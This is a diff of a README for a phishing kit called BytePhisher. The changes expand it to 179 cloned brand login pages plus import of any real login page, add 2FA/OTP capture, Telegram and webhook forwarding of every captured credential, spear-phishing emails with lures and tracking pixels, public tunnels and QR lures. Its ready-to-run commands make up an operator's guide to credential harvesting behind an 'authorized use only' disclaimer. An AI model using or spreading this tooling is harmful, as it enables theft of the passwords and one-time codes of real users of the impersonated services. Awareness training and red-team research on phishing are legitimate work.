@@ -3,9 +3,10 @@
 **Advanced phishing-simulation framework** for authorized security-awareness
 engagements, red-team exercises and CTF/lab work.
 
-Pure-Python engine (no PHP), 80 brand templates, 6 concurrent tunnels,
-SQLite capture store, live TUI + optional web dashboard, 2FA/OTP flow,
-SMTP spear-phishing module and CSV/JSON export.
+Pure-Python engine (no PHP), 179 brand templates, 6 concurrent tunnels,
+SQLite capture store, live TUI + web dashboard, 2FA/OTP flow, campaign tagging
+with A/B template rotation, bot/scanner risk scoring, QR codes, one-file HTML
+campaign reports, SMTP spear-phishing module and CSV export.
 
 > Authorized use only. Run it against systems you own or are contracted to
 > test — a client engagement, an awareness campaign with written sign-off, or
@@ -18,9 +19,12 @@ SMTP spear-phishing module and CSV/JSON export.
 | Capability | PyPhisher | BlackEye | ZPhisher | **BytePhisher** |
 |---|---|---|---|---|
 | Server stack | PHP required | PHP required | PHP required | **pure Python (no PHP)** |
-| Templates | 77 | 33 | 30+ | **80 (generator: add a site = one tuple)** |
+| Templates | 77 | 33 | 30+ | **179 built-in + import any real login page** |
 | Tunnels | 4 (concurrent) | LAN / 1 | 1 | **6 concurrent (cloudflared, ngrok, localhost.run, serveo, bore, hoplink)** |
 | Capture store | text file | text file | text file | **SQLite (WAL) + CSV/JSON export** |
+| Campaigns | ✗ | ✗ | ✗ | **✓ tagging, per-campaign stats, A/B template rotation** |
+| Bot/scanner triage | ✗ | ✗ | ✗ | **✓ 0-100 risk score with reasons + "credible" counts** |
+| HTML campaign report | ✗ | ✗ | ✗ | **✓ self-contained, one file, QR optional** |
 | Real client IP behind tunnel | ✗ | partial | ✗ | **✓ CF-Connecting-IP / XFF / X-Real-IP** |
 | Geo + ISP + datacenter enrichment | partial | ✓ | ✗ | **✓ (ipapi / ipinfo, off switch)** |
 | Device / OS classification | ✓ | ✓ | ✗ | **✓ iOS/Android/Win/macOS/Linux** |
@@ -51,7 +55,7 @@ No PHP, no web server, no external binaries except the tunnel client you pick
 ## Quick start
 
 ```bash
-# list the 80 templates
+# list the templates
 ./.venv/bin/python bytephisher.py --list
 
 # local-only dry run (no tunnel), Google template on :8080
@@ -61,11 +65,17 @@ No PHP, no web server, no external binaries except the tunnel client you pick
 ./.venv/bin/python bytephisher.py -o instagram -t cloudflared --otp \
     -u https://example.com/after --geo ipapi
 
-# every tunneler at once, plus the web dashboard on :8090
-./.venv/bin/python bytephisher.py -o netflix -t all --web-dashboard
+# campaign with tagging, A/B rotation, QR, Telegram alerts and the dashboard
+./.venv/bin/python bytephisher.py -o google --rotate google,instagram \
+    --campaign q3-payroll --qr data/qr.png \
+    --telegram "123456:AA...:987654321" --web-dashboard
 
-# export everything captured so far
-./.venv/bin/python bytephisher.py --export out.csv
+# every tunneler at once
+./.venv/bin/python bytephisher.py -o netflix -t all
+
+# pull the data out
+./.venv/bin/python bytephisher.py --export data/captures.csv
+./.venv/bin/python tools/report.py --campaign q3-payroll --out data/q3.html
 ```
 
 ### Flags
@@ -81,10 +91,134 @@ No PHP, no web server, no external binaries except the tunnel client you pick
 | `--tls --cert` | serve HTTPS from a PEM cert (+ key at the same path with `key` in the name) |
 | `--geo` | `ipapi` \| `ipinfo` \| `off` |
 | `--web-dashboard` / `--web-port` | Flask dashboard + JSON API |
-| `--export PATH` | dump captures to CSV and exit |
+| `--telegram TOKEN:CHAT_ID` | send every capture to a Telegram chat |
+| `--webhook URL` | POST every capture as JSON (Discord / Slack / n8n / Mattermost) |
+| `--mailto a@x.com[,b@y.com]` | after tunnels are up, email the live link via SMTP |
+| `--mail-template` | `password_reset` \| `security_alert` \| `shared_doc` \| `invoice` |
+| `--campaign NAME` | tag captures with a campaign (default: template slug) |
+| `--rotate a,b,c` | serve a random one of these templates per request (A/B) |
+| `--qr [PATH]` | save a QR code PNG of the live link (default `data/qr.png`) |
+| `--report PATH` | write a self-contained HTML campaign report and exit |
+| `--export PATH` | dump captures (`.json` → JSON, anything else → CSV) and exit |
 | `--no-tui` | plain refresh output instead of the full-screen dashboard |
 
 ---
+
+## Capture alerts (real-time)
+
+```bash
+# Telegram: every capture pings your chat
+./.venv/bin/python bytephisher.py -o google -t cloudflared --telegram "123456:AA...:987654321"
+
+# Discord/Slack/n8n webhook instead (or both at once)
+./.venv/bin/python bytephisher.py -o google --webhook https://discord.com/api/webhooks/...
+```
+
+Alerts fire on a daemon thread and are wrapped in try/except, so a dead webhook
+can never slow down or break the capture path. Same values can live in
+`config/config.yaml` (`telegram`, `webhook`).
+
+## Email open-tracking
+
+Every HTML mail built by `mailer.to_html(body, base=<public url>)` embeds a 1x1
+`/px.gif` pixel served by BytePhisher itself; loading the mail counts a visit,
+so opens are visible in the dashboard even when nobody submits the form.
+
+## Tunnel reality check
+
+`tools/probe_tunnels.py` starts a real server, brings up each tunneler, fetches
+the public URL over the internet and reports the truth. Latest run from this
+build (honest, not aspirational):
+
+| Tunneler | Public page served | Notes |
+|---|---|---|
+| `cloudflared` | YES | auto-downloads the binary if missing; waits for edge registration so the first hit isn't a 530 |
+| `localhost_run` | YES | needs `ssh`; no account |
+| `bore` | YES | auto-downloads the musl binary from GitHub releases; `http://bore.pub:<port>` (no TLS) |
+| `ngrok` | NO (untested) | binary not installed here and free ngrok now requires an authtoken |
+| `serveo` | NO | service has been sunset/unreliable for years; adapter fails soft |
+| `hoplink` | NO | service not answering; adapter fails soft |
+
+A dead tunneler returns `None` and the rest keep working — `-t all` brings up
+everything it can and prints which links are live.
+
+## Risk scoring (bot / scanner triage)
+
+Every submission is scored 0–100 with human-readable reasons — nothing is
+silently dropped, so campaign numbers stay defensible:
+
+| Signal | Weight |
+|---|---|
+| automation user-agent (`curl`, `python-requests`, headless, scanners) or missing UA | +40 |
+| datacenter / hosting ISP (OVH, AWS, Hetzner, DigitalOcean, …) | +35 |
+| honeypot field filled (blind autofill) | +40 |
+| submit faster than 0.8 s (1.5 s partially) | +30 / +15 |
+| unrecognised device / no geo | +10 / +5 |
+
+`low` < 30 ≤ `medium` < 70 ≤ `high`. The dashboard shows the level per row, the
+report has a per-row risk column and the "Credible (low risk)" KPI next to raw
+credential counts, CSV/JSON exports carry `risk` + `risk_reasons`, and alerts
+include the score.
+
+## Campaigns and A/B rotation
+
+```bash
+# one database, several campaigns
+./.venv/bin/python bytephisher.py -o google   --campaign q3-payroll -t cloudflared
+./.venv/bin/python bytephisher.py -o netflix  --campaign q4-invoice -t cloudflared
+
+# A/B: each visitor gets one of these templates, captures keep the campaign tag
+./.venv/bin/python bytephisher.py -o google --rotate google,instagram,netflix \
+    --campaign q4-ab-test
+
+curl -s 'localhost:8090/api/stats?campaign=q4-ab-test'
+./.venv/bin/python bytephisher.py --report data/q4.html --campaign q4-ab-test
+```
+
+## Reports and QR codes
+
+```bash
+./.venv/bin/python bytephisher.py --report data/report.html      # whole DB
+./.venv/bin/python tools/report.py --campaign q3-payroll --out data/q3.html \
+        --qr https://<tunnel>/          # embeds campaign_qr.png next to the report
+./.venv/bin/python bytephisher.py --qr data/qr.png               # during a live run
+```
+
+The report is a single HTML file: KPIs, campaign table, geography / device /
+ISP distributions, hourly timeline and every submission with risk reasons. No
+CDN, no JS, opens offline, prints to PDF.
+
+## Load testing your own instance
+
+```bash
+./.venv/bin/python tools/stress.py --port 8080 --concurrency 25 --total 1000 --mix --db data/bytephisher.db
+```
+
+Prints throughput, p50/p95/p99 latency, HTTP error counts and — with `--db` —
+the row count actually written, so a "successful" run cannot hide lost captures.
+
+## Deployment
+
+| Target | How |
+|---|---|
+| Docker | `docker compose up -d` (see `docker-compose.yml`, dashboard on :8090) |
+| systemd | `cp deploy/bytephisher.service /etc/systemd/system/ && systemctl enable --now bytephisher` |
+| Android/Termux | `bash deploy/install-termux.sh` (auto-downloads cloudflared arm64 on first use) |
+| Anywhere | `make install && make run` |
+
+## Documentation
+
+* `README.md` — this file: capabilities, flags, verification evidence
+* `docs/USAGE.md` — operator walkthrough, campaign by campaign
+* `docs/TESTING.md` — test tiers, what is really verified, how to debug failures
+* `CHANGELOG.md` — what changed and which bug each fix came from
+
+### Before every campaign
+
+```bash
+./.venv/bin/python bytephisher.py --doctor      # deps, templates, DB, tunnelers
+./.venv/bin/python tools/probe_tunnels.py       # which tunnelers work right now
+```
 
 ## Architecture
 
@@ -92,16 +226,25 @@ No PHP, no web server, no external binaries except the tunnel client you pick
 bytephisher.py          CLI: arg parsing → template pick → server → tunnels → dashboard
 core/
   server.py             threaded HTTP server, TLS, forwarded-IP resolution,
-                        geo/device enrichment, honeypot + OTP flow
-  capture.py            SQLite store (captures + visitors), thread-safe, CSV export
+                        geo/device enrichment, honeypot + OTP flow, rotation
+  capture.py            SQLite store (captures + visitors + campaign + risk),
+                        thread-safe, in-place migrations, CSV export
   templates.py          Jinja2 rendering, OTP/thank-you pages
-tunnels/__init__.py     6 tunneler adapters, auto-download, URL scraping from logs
+  risk.py               0-100 bot/scanner scoring with human-readable reasons
+  alerts.py             Telegram + generic webhook notifications
+  links.py              QR code generation (PNG/SVG/terminal)
+tunnels/__init__.py     6 tunneler adapters, auto-download, URL scraping from logs,
+                        process tracking + clean shutdown
 dashboard/__init__.py   rich TUI (live_loop), Flask web dashboard + JSON API
-mailer/__init__.py      SMTP spear-phishing (4 templates, {{variable}} substitution)
-tools/gen_templates.py  80-site template generator (add a site = one tuple)
+mailer/__init__.py      SMTP spear-phishing (4 templates, HTML, tracking pixel)
+tools/gen_templates.py  179-site template generator (add a site = one tuple)
+tools/import_site.py    import any real login page as a template
+tools/report.py         self-contained HTML campaign report
+tools/probe_tunnels.py  probe all six tunnelers against the real internet
+deploy/                 systemd unit, Termux installer
 templates/              generated sites: index.html, otp.html, fields.json
-config/config.yaml      defaults (port, db, geo provider, smtp, tunnels)
-tests/test_e2e.py       22-assertion end-to-end suite (real HTTP + real SQLite)
+config/config.yaml      defaults (port, db, geo provider, smtp, alerts)
+tests/                  unit / HTTP / feature / live suites + run_all.py runner
 ```
 
 ### Request lifecycle
@@ -144,9 +287,20 @@ docker run --rm -p 8080:8080 -p 8090:8090 -v "$PWD/data:/app/data" bytephisher \
 ## Tests
 
 ```bash
-./.venv/bin/python tests/test_e2e.py
-# 22 passed, 0 failed  — drives a real HTTP server, real POSTs, real SQLite
+./.venv/bin/python tests/run_all.py          # full suite, honest summary
+./.venv/bin/python tests/run_all.py --fast   # skip the live/internet suite
 ```
+
+| Suite | What it proves |
+|---|---|
+| `tests/test_e2e.py` | standalone end-to-end: real HTTP server, real POST, real SQLite rows |
+| `tests/test_units.py` | body parsing (urlencoded/multipart/JSON/unicode), credential detection, device classification, capture DB (+concurrency, dedupe, migrations, CSV/JSON), all 179 templates, mailer rendering, alerts, tunneler URL patterns, CLI helpers, custom-site import |
+| `tests/test_http.py` | live HTTP behaviour: GET/POST variants, honeypot, timing field, forwarded-IP resolution, device detection over the wire, redirect mode, OTP flow, TLS, webhook firing end-to-end, 40 parallel submissions |
+| `tests/test_features.py` | risk engine + risk over HTTP, QR output, HTML report (incl. escaping), template rotation, alert payloads, new CLI flags, JSON/CSV export, stress tool integrity |
+| `tests/test_live.py` | real internet: geo lookup, cloudflared/localhost.run/bore tunnels with a public POST landing in SQLite, Flask dashboard API, real SMTP delivery via a local aiosmtpd sink, CLI subprocess runs with SIGINT summary, TUI live loop |
+
+Live tests skip (with a reason) when an external service is unavailable — they
+never fake a pass.
 
 ## Legal
 
